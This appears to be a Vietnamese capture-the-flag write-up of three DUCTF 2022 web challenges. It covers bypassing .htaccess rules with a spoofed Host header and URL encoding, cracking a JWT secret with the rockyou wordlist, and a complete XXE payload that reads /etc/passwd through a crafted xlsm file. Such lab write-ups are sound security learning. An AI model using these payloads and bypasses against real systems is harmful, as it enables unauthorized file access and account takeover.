## helicoptering

```
Helicoptering
The two parts of the flag are available at the locations below:

part one
part two
Unfortunately, they are both protected by an .htaccess file:

one/.htaccess
RewriteEngine On
RewriteCond %{HTTP_HOST} !^localhost$
RewriteRule ".*" "-" [F]
    
two/.htaccess
RewriteEngine On
RewriteCond %{THE_REQUEST} flag
RewriteRule ".*" "-" [F]
    
Your job is to bypass these restrictions and view the flag files anyway. Good luck!
```

Đọc 2 file flag trong 2 folder one và two. vấn đề là mỗi folder có 1 file .htaccess. Bypass one bằng cách intercept qua burp và sửa header Host thành localhost. Bypass 2 bằng cách urlencode từ flag (%66lag)

## Treasure Hunt

 ![Treasurehunt](https://github.com/zimap1102/nhatdeptrai/blob/main/ductf2022/Screenshot%202022-09-28%20094235.png)
 1 bài dùng jwt token. cơ bản là login vào với token của admin => flag nằm ở phần treasure.
 dùng hashcode + wordlist rockyou để crack secretkey => onepiece. login và lấy flag.

## dyslexxec

source code: dyslexxec.tar.gz 
 Bài này XXE. flag nằm trong file /etc/passwd. lỗi code ở đoạn 

 ```
 internalNode = root.find(".//{http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac}absPath")
        if internalNode != None:
            prop = {
                "Fieldname":"absPath",
                "Attribute":internalNode.attrib["url"],
                "Value":internalNode.text
            }
        return prop

 ```

 đổi đuôi file của file xlsm sang zip, unzip và tìm absPart. absPart nằm trong workbook.xml. chèn mã XXE vào file này, nén zip lại và đổi lại đuôi file.

 payload 
 ```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x15" xmlns:x15="http://schemas.microsoft.com/office/spreadsheetml/2010/11/main"><fileVersion appName="xl" lastEdited="7" lowestEdited="7" rupBuild="16925"/><workbookPr defaultThemeVersion="164011"/><mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"><mc:Choice Requires="x15"><x15ac:absPath url="C:\Users\ulikma\Downloads\" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac">&xxe;</x15ac:absPath></mc:Choice></mc:AlternateContent><bookViews><workbookView xWindow="0" yWindow="0" windowWidth="19200" windowHeight="6950"/></bookViews><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets><calcPr calcId="171027"/><extLst><ext uri="{140A7094-0E35-4892-8432-C4D2E57EDEB5}" xmlns:x15="http://schemas.microsoft.com/office/spreadsheetml/2010/11/main"><x15:workbookPr chartTrackingRefBase="1"/></ext></extLst></workbook>
 ```
